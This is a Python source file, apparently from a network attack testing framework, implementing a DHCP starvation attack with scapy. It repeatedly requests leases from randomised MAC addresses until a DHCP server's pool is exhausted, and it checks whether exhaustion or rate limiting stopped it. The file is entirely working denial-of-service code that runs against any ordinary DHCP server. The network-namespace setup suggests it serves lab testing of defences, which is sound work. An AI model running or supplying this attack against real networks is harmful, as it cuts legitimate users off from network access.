from attacks.attack import Attack
import netns
import scapy.all as scapy
from lib.helper import random_unicast_mac

class DHCPStarvation(Attack):
    """
    Perform a DHCP Starvation Attach against an existing DHCP Server.

    Sends several DHCP Requests with different MAC addresses to exhaust the DHCP pool.
    """

    def dhcp_request(self, nsname='host0', hw=None, timeout=25, *args, **kwargs) -> scapy.Packet | None:
        with netns.NetNS(nsname=nsname):
            scapy.conf.ifaces.reload()
            scapy.conf.route.resync()
            scapy.conf.checkIPaddr = False
            return scapy.dhcp_request(hw=hw, timeout=timeout, *args, **kwargs)

    def setup(self) -> bool:
        """
        Check if a DHCP server answers.
        :return: True if DHCP lease can be acquired otherwise False
        """
        ans = self.dhcp_request(nsname='host0')
        ans2 = self._check_second_interface()
        if ans is None or ans2 is None:
            return False
        else:
            return True

    def attack(self, fails: int) -> int:
        """
        Tries to acquire as many DHCP leases as possible and returns the number
        of successfully acquired leases.
        :param fails: Number of consecutive DHCP lease acquires that may fail
        :return: Number of acquired leases
        """
        num_fail = 0
        num_leases = 0
        while True:
            mac = random_unicast_mac()
            ans = self.dhcp_request(nsname='host0', hw=mac)
            if ans is None:
                num_fail += 1
            else:
                adr = ans.getlayer(scapy.BOOTP).yiaddr
                ans =self.dhcp_request(hw=mac,
                                         req_type='request',
                                         requested_addr=adr,
                                         timeout=5)
                if ans is None:
                    num_fail += 1
                else:
                    num_fail = 0
                    num_leases += 1
            if num_fail > fails:
                return num_leases

    def _check_second_interface(self) -> bool:
        mac = random_unicast_mac()
        ans = self.dhcp_request(nsname='host2', hw=mac)
        if ans is None:
            return False
        else:
            return True

    def run(self) -> bool:
        """
        Run DHCP Starvation attack.
        :return: Bool which indicates success of the attack
        """
        if not self.setup():
            raise RuntimeError("No answering DHCP Server in the network.")
        print("DHCP Discover success!")
        num_leases = self.attack(5)
        print(f"{num_leases} DHCP Leases acquired.")
        notempty = self._check_second_interface()
        if notempty:
            print('Probably rate limited')
            return False
        else:
            print('DHCP Pool exhausted')
            return True

